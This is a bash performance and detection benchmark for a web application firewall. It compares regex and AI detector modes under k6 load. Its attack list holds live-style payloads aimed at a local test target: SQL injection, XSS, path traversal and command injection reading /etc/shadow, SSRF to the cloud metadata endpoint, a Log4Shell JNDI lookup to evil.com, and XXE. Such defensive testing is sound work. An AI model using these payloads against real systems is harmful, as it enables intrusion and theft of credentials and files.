#!/usr/bin/env bash
# tests/perf/ai-compare.sh
#
# Side-by-side perf+detection comparison of the WAF detector chain
# across four toggle modes:
#
#   A — ALL  on (regex chain + AI)
#   B — AI ONLY  (regex off, AI on)
#   C — REGEX ONLY (AI off, regex on)
#   D — NONE     (no detectors — WAF latency floor)
#
# For each case we boot the release WAF, run a fixed-rate k6 load
# (constant-arrival-rate, attack+clean mix), capture /metrics
# before/after, and roll up to a Markdown report.
#
# Output: tests/results/run-ai-compare-<UTC-date>/REPORT.md
#
# Usage:
#   bash tests/perf/ai-compare.sh
#   RPS=800 DURATION=30s bash tests/perf/ai-compare.sh   # heavier
#   ONLY="A B" bash tests/perf/ai-compare.sh             # subset
#
# Requirements:
#   - release WAF built with `--features "redis geoip ai"`
#   - dev Redis up (`make redis-up`)
#   - upstream on :9999 (e.g. /tmp/aegis-fast-upstream)
#   - k6 in PATH
#   - data/ai_model/waf_model.onnx present

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
cd "$REPO_ROOT"

RPS="${RPS:-500}"
DURATION="${DURATION:-30s}"
ATTACK_PCT="${ATTACK_PCT:-60}"
RUN_ID="$(date -u +%Y-%m-%d-%H%M%S)"
OUT_DIR="$REPO_ROOT/tests/results/run-ai-compare-$RUN_ID"
ONLY="${ONLY:-A B C D}"
mkdir -p "$OUT_DIR"

DATA="${AEGIS_DATA:-http://127.0.0.1:8080}"
ADMIN="${AEGIS_ADMIN:-http://127.0.0.1:9443}"
WAF_BIN="${WAF_BIN:-$REPO_ROOT/target/release/waf}"
BASE_CFG="$REPO_ROOT/config/dev.yaml"
K6_SCRIPT="$OUT_DIR/load.js"

# ── pre-flight ──────────────────────────────────────────────────
echo "==> AI Detector perf comparison · run=$RUN_ID rps=$RPS dur=$DURATION"
[[ -x "$WAF_BIN" ]] || { echo "  FAIL: $WAF_BIN missing — run \`FEATURES=\\\"redis geoip ai\\\" make build\`"; exit 1; }
command -v k6 >/dev/null || { echo "  FAIL: k6 not on PATH"; exit 1; }
command -v python3 >/dev/null || { echo "  FAIL: python3 missing"; exit 1; }
[[ -s "$REPO_ROOT/data/ai_model/waf_model.onnx" ]] || { echo "  FAIL: AI model missing"; exit 1; }

# ── config templating (precise, line-aware) ─────────────────────
write_config() {
  # $1 = case (A|B|C|D)
  # $2 = output path
  python3 - "$BASE_CFG" "$1" "$2" <<'PY'
import re, sys
src, case, dst = sys.argv[1:]
text = open(src).read()

# 1) Detectors block — flip every "{ enabled: <bool> }" to a target
det_target = "true" if case in ("A","C") else "false"
def flip_det(m):
    return f"{m.group(1)}{{ enabled: {det_target} }}"
# Lines like:  sqli: { enabled: true }
text = re.sub(
    r"(^[ \t]+\w+:\s*)\{\s*enabled:\s*\w+\s*\}",
    flip_det, text, flags=re.MULTILINE,
)

# 2) AI block — top-level `ai:` with `  enabled: <bool>` two lines later
ai_target = "true" if case in ("A","B") else "false"
text = re.sub(
    r"(^ai:\s*\n[ \t]*enabled:\s*)\w+",
    lambda m: f"{m.group(1)}{ai_target}", text, flags=re.MULTILINE,
)

# 3) ai.mode → enforce so blocks are observable in HTTP status codes
text = re.sub(
    r"(^ai:\s*\n(?:[ \t]+\w[^\n]*\n){0,6}[ \t]+mode:\s*)\w+",
    lambda m: f"{m.group(1)}enforce", text, flags=re.MULTILINE,
)

open(dst, "w").write(text)
PY
}

# ── k6 script ───────────────────────────────────────────────────
cat > "$K6_SCRIPT" <<'JS'
import http from 'k6/http';
import { check } from 'k6';
import { Counter, Trend } from 'k6/metrics';

const RPS = Number(__ENV.RPS || 500);
const DURATION = __ENV.DURATION || '30s';
const ATTACK_PCT = Number(__ENV.ATTACK_PCT || 60);
const TARGET = __ENV.TARGET || 'http://127.0.0.1:8080';

export const options = {
  scenarios: {
    mix: {
      executor: 'constant-arrival-rate',
      rate: RPS, timeUnit: '1s', duration: DURATION,
      preAllocatedVUs: Math.max(50, RPS / 10),
      maxVUs: Math.max(100, RPS / 4),
    },
  },
  thresholds: {
    http_req_failed: ['rate<1.0'],   // never fail the run; we report
  },
  noConnectionReuse: false,
};

const ATTACK = [
  ["GET", "/search?q=1%27+OR+%271%27%3D%271", null],
  ["GET", "/user?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", null],
  ["GET", "/page?n=%3Cscript%3Ealert(1)%3C/script%3E", null],
  ["POST", "/comment", "body=<img src=x onerror=alert(1)>"],
  ["GET", "/files?p=../../../etc/passwd", null],
  ["GET", "/files?p=..%2F..%2F..%2Fetc%2Fpasswd", null],
  ["GET", "/ping?host=127.0.0.1;cat+/etc/shadow", null],
  ["GET", "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", null],
  ["GET", "/.env", null],
  ["GET", "/wp-admin/setup-config.php", null],
  ["GET", "/.git/config", null],
  ["GET", "/admin/login", "User-Agent:sqlmap/1.7"],
  ["GET", "/admin?cmd=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fx%7D", null],
  ["POST", "/api/upload", "body=<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"],
  ["POST", "/api/update", 'body={"username":"x","is_admin":true,"role":"superuser"}'],
];
const CLEAN = [
  ["GET", "/", null],
  ["GET", "/index.html", null],
  ["GET", "/api/users/100", null],
  ["GET", "/api/products/list?page=1&sort=name", null],
  ["GET", "/static/main.js", null],
  ["GET", "/static/styles.css", null],
  ["GET", "/robots.txt", null],
  ["POST", "/api/login", "body=username=alice&password=correctbatteryhorse"],
  ["POST", "/api/orders", 'body={"id":42,"qty":3}'],
  ["GET", "/v2/api/blog/post-1", null],
];

const detectedAttacks = new Counter('detected_attacks');
const allowedAttacks  = new Counter('allowed_attacks');
const blockedClean    = new Counter('blocked_clean');
const allowedClean    = new Counter('allowed_clean');
const attackLatency   = new Trend('attack_latency_ms', true);
const cleanLatency    = new Trend('clean_latency_ms', true);

function pickFrom(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

export default function () {
  const isAttack = Math.random() * 100 < ATTACK_PCT;
  const [m, p, extra] = pickFrom(isAttack ? ATTACK : CLEAN);
  const url = TARGET + p;
  const params = { headers: { 'accept': '*/*' } };
  let body = null;
  if (extra && extra.startsWith('User-Agent:')) {
    params.headers['user-agent'] = extra.slice('User-Agent:'.length);
  } else if (extra && extra.startsWith('body=')) {
    body = extra.slice('body='.length);
    params.headers['content-type'] = body.trimStart().startsWith('{')
      ? 'application/json' : 'application/x-www-form-urlencoded';
  }
  const res = (m === 'POST') ? http.post(url, body, params) : http.get(url, params);
  const blocked = res.status === 401 || res.status === 403 || res.status === 429;
  if (isAttack) {
    attackLatency.add(res.timings.duration);
    if (blocked) detectedAttacks.add(1); else allowedAttacks.add(1);
  } else {
    cleanLatency.add(res.timings.duration);
    if (blocked) blockedClean.add(1); else allowedClean.add(1);
  }
  check(res, { 'response received': r => r.status > 0 });
}
JS

# ── /metrics scraping helpers ────────────────────────────────────
scrape_metrics() {
  curl -sf --max-time 5 "$ADMIN/metrics" 2>/dev/null || true
}

# ── run a single case ───────────────────────────────────────────
run_case() {
  local mode="$1"
  local case_dir="$OUT_DIR/case-$mode"
  mkdir -p "$case_dir"
  local cfg="$case_dir/config.yaml"

  echo
  echo "==> Case $mode"
  pkill -KILL -f "$WAF_BIN run" 2>/dev/null || true
  sleep 1

  write_config "$mode" "$cfg"

  echo "  booting WAF…"
  "$WAF_BIN" run --config "$cfg" >"$case_dir/waf.log" 2>&1 &
  local pid=$!

  local ready=0
  for _ in $(seq 1 20); do
    sleep 1
    if curl -fsS --max-time 2 "$ADMIN/healthz/ready" >/dev/null 2>&1; then
      ready=1; break
    fi
    if ! ps -p "$pid" >/dev/null; then
      echo "  FAIL: WAF died — log tail:"; tail -15 "$case_dir/waf.log"; return 1
    fi
  done
  [[ $ready -eq 1 ]] || { echo "  FAIL: WAF didn't become ready"; tail -15 "$case_dir/waf.log"; kill -KILL "$pid" 2>/dev/null; return 1; }
  echo "  WAF ready (pid=$pid)"

  scrape_metrics > "$case_dir/metrics-before.txt"

  echo "  driving k6 @ $RPS rps for $DURATION ($ATTACK_PCT% attack)…"
  RPS="$RPS" DURATION="$DURATION" ATTACK_PCT="$ATTACK_PCT" TARGET="$DATA" \
    k6 run --quiet \
      --summary-export="$case_dir/k6-summary.json" \
      --summary-trend-stats="avg,min,med,max,p(90),p(95),p(99)" \
      "$K6_SCRIPT" > "$case_dir/k6.log" 2>&1 || true

  scrape_metrics > "$case_dir/metrics-after.txt"

  # capture WAF RSS while it's still alive
  ps -o rss= -p "$pid" 2>/dev/null | awk '{print $1}' > "$case_dir/rss-kb.txt" || echo "0" > "$case_dir/rss-kb.txt"

  kill -KILL "$pid" 2>/dev/null
  sleep 1

  # roll up
  python3 - "$case_dir" "$mode" > "$case_dir/summary.json" <<'PY'
import json, os, re, sys
case_dir, mode = sys.argv[1:]
def read(p):
    try: return open(p).read()
    except FileNotFoundError: return ""
ks = json.loads(read(os.path.join(case_dir, "k6-summary.json")) or "{}")
mb = read(os.path.join(case_dir, "metrics-before.txt"))
ma = read(os.path.join(case_dir, "metrics-after.txt"))
rss = (read(os.path.join(case_dir, "rss-kb.txt")).strip() or "0")

# k6 --summary-export stores trend/rate values as flat keys on the
# metric dict (no inner "values"). Counters are flat too.
metrics = ks.get("metrics", {})

def num(name, key="count"):
    v = metrics.get(name, {})
    return v.get(key, 0) if isinstance(v, dict) else 0

def trend(name):
    v = metrics.get(name, {})
    return {
        "avg": round(v.get("avg", 0), 2),
        "p50": round(v.get("med", 0), 2),
        "p90": round(v.get("p(90)", 0), 2),
        "p95": round(v.get("p(95)", 0), 2),
        "p99": round(v.get("p(99)", 0), 2),
        "max": round(v.get("max", 0), 2),
    }

attacks_det = int(num("detected_attacks") or 0)
attacks_allow = int(num("allowed_attacks") or 0)
clean_det = int(num("blocked_clean") or 0)
clean_allow = int(num("allowed_clean") or 0)

http_reqs = int(num("http_reqs") or 0)
rate = metrics.get("http_reqs", {}).get("rate", 0)

def parse_counter(blob, name):
    out = {}
    for ln in blob.splitlines():
        if not (ln.startswith(name + " ") or ln.startswith(name + "{")):
            continue
        m = re.match(r'^([a-zA-Z_]+)(?:\{([^}]*)\})?\s+([\d.eE+-]+)$', ln)
        if not m: continue
        nm, labels, val = m.groups()
        if nm != name: continue
        try: out[labels or ""] = float(val)
        except: continue
    return out

def delta(after, before):
    return {k: after.get(k, 0) - before.get(k, 0)
            for k in (set(after) | set(before))
            if after.get(k, 0) - before.get(k, 0) > 0}

# Real metric names exposed by aegis-control are `waf_*`, not `aegis_*`.
hits_b = parse_counter(mb, "waf_detector_hits_total")
hits_a = parse_counter(ma, "waf_detector_hits_total")
hits_d = delta(hits_a, hits_b)

eval_sum_b  = parse_counter(mb, "waf_detector_evaluation_duration_ms_sum")
eval_sum_a  = parse_counter(ma, "waf_detector_evaluation_duration_ms_sum")
eval_cnt_b  = parse_counter(mb, "waf_detector_evaluation_duration_ms_count")
eval_cnt_a  = parse_counter(ma, "waf_detector_evaluation_duration_ms_count")
eval_sum_d  = delta(eval_sum_a, eval_sum_b)
eval_cnt_d  = delta(eval_cnt_a, eval_cnt_b)

ai_label = 'class="ai"'
ai_inf_count = int(eval_cnt_d.get(ai_label, 0))
ai_inf_sum_ms = eval_sum_d.get(ai_label, 0)
ai_mean_us   = round((ai_inf_sum_ms / ai_inf_count) * 1000, 1) if ai_inf_count else 0
ai_hits      = int(hits_d.get(ai_label, 0))

attacks_total = attacks_det + attacks_allow
clean_total = clean_det + clean_allow
out = {
    "mode": mode,
    "throughput_rps": round(rate, 1),
    "http_reqs": http_reqs,
    "attacks_total": attacks_total,
    "attacks_detected": attacks_det,
    "detection_rate_pct": round(100*attacks_det/max(attacks_total,1), 1),
    "clean_total": clean_total,
    "clean_blocked": clean_det,
    "false_positive_rate_pct": round(100*clean_det/max(clean_total,1), 1),
    "http_req_duration_ms": trend("http_req_duration"),
    "attack_latency_ms": trend("attack_latency_ms"),
    "clean_latency_ms": trend("clean_latency_ms"),
    "rss_kb": int(rss),
    "detector_hits": {k: int(v) for k, v in hits_d.items()},
    "ai_hits": ai_hits,
    "ai_inference_count": ai_inf_count,
    "ai_inference_mean_us": ai_mean_us,
    "ai_inference_total_ms": round(ai_inf_sum_ms, 1),
}
print(json.dumps(out, indent=2))
PY
  echo "  case $mode summary written"
}

# ── run all selected cases ──────────────────────────────────────
for mode in $ONLY; do
  run_case "$mode" || echo "  case $mode FAILED — see $OUT_DIR/case-$mode/waf.log"
done

# ── build comparison report ─────────────────────────────────────
REPORT="$OUT_DIR/REPORT.md"
python3 - "$OUT_DIR" "$RUN_ID" "$RPS" "$DURATION" "$ATTACK_PCT" "$ONLY" > "$REPORT" <<'PY'
import json, os, sys
out_dir, run_id, rps, dur, attack_pct, only = sys.argv[1:]
labels = {
  "A": "ALL on (regex+AI)",
  "B": "AI ONLY",
  "C": "REGEX ONLY",
  "D": "NONE (baseline)",
}
modes = only.split()

def load(m):
    p = os.path.join(out_dir, f"case-{m}", "summary.json")
    if not os.path.exists(p): return None
    try: return json.load(open(p))
    except json.JSONDecodeError: return None

print(f"# AI Detector — perf + detection comparison")
print()
print(f"- **Run ID**: `{run_id}`")
print(f"- **Target RPS**: {rps}  ·  **Duration**: {dur}  ·  **Attack mix**: {attack_pct} %")
print(f"- **Cases**: {', '.join(modes)}")
print()
print("## Headline")
print()
print("| Case | Mode | Throughput rps | Detect % | FP % | Attack p50 / p95 / max ms | Clean p50 / p95 / max ms | RSS MB |")
print("|---|---|---|---|---|---|---|---|")
for m in modes:
    d = load(m)
    if not d:
        print(f"| {m} | — | — | — | — | — | — | — |")
        continue
    a, c = d["attack_latency_ms"], d["clean_latency_ms"]
    print(f"| {m} | {labels.get(m, m)} | {d['throughput_rps']} | {d['detection_rate_pct']} | {d['false_positive_rate_pct']} | "
          f"{a['p50']} / {a['p95']} / {a['max']} | {c['p50']} / {c['p95']} / {c['max']} | {round(d['rss_kb']/1024,1)} |")
print()
print("## Detection breakdown (counts)")
print()
print("| Case | Attacks total | Caught | Missed | Clean total | False-blocked | Allowed-clean |")
print("|---|---|---|---|---|---|---|")
for m in modes:
    d = load(m)
    if not d: continue
    print(f"| {m} | {d['attacks_total']} | {d['attacks_detected']} | {d['attacks_total']-d['attacks_detected']} | "
          f"{d['clean_total']} | {d['clean_blocked']} | {d['clean_total']-d['clean_blocked']} |")
print()
print("## AI inference cost")
print()
print("| Case | AI hits | AI inferences | Mean inference µs | Total inf. ms |")
print("|---|---|---|---|---|")
for m in modes:
    d = load(m)
    if not d: continue
    print(f"| {m} | {d.get('ai_hits',0)} | {d.get('ai_inference_count',0)} | "
          f"{d.get('ai_inference_mean_us',0)} | {d.get('ai_inference_total_ms',0)} |")
print()
print("## Per-class detector hits (waf_detector_hits_total deltas)")
print()
classes = ["ai","sqli","xss","path_traversal","ssrf","recon","body_abuse","brute_force","header_injection"]
print("| Case | " + " | ".join(classes) + " |")
print("|---|" + "---|" * len(classes))
for m in modes:
    d = load(m)
    if not d: continue
    cells = [str(d.get("detector_hits", {}).get(f'class="{cls}"', 0)) for cls in classes]
    print(f"| {m} | " + " | ".join(cells) + " |")
print()
print("## Notes")
print()
print("- **Detection %** = attacker probes blocked (HTTP 401/403/429) / attacker probes total.")
print("- **FP %** = benign probes blocked / benign probes total.")
print("- `ai.mode: enforce` in cases A and B so AI verdicts surface as HTTP 403.")
print("- All cases use the same Redis state backend and upstream — only detector toggles differ.")
print()
print("## Raw artefacts")
print()
for m in modes:
    print(f"- `case-{m}/` — config.yaml · waf.log · k6.log · k6-summary.json · summary.json · metrics-before/after.txt")
PY

echo
cat "$REPORT"
echo
echo "==> report saved at $REPORT"
